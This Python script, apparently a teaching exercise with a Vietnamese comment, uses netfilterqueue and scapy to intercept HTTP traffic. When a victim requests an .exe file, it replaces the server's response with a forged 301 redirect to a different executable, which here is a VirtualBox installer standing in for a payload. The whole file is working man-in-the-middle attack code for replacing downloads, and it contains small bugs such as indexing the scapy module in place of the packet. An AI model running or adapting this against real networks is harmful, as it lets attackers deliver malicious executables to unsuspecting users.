import netfilterqueue
import scapy.all as scapy

# netfilterqueue: Chi dung cho python < 3.7

ack_list = []

def process_packet(packet):
    sc_packet = scapy.IP(packet.get_payload())
    if sc_packet.haslayer(scapy.Raw):
        if sc_packet[scapy.TCP].dport == 80:
            if b".exe" in sc_packet[scapy.Raw].load and "download.virtualbox.org" not in sc_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy[scapy.TCP].ack)

        elif sc_packet[scapy.TCP].sport == 80:
            if sc_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(sc_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                sc_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://download.virtualbox.org/virtualbox/6.1.22/VirtualBox-6.1.22-144080-Win.exe\n\n"

                del sc_packet[scapy.IP].len
                del sc_packet[scapy.IP].chksum
                del sc_packet[scapy.TCP].chksum

            packet.set_payload(bytes(sc_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()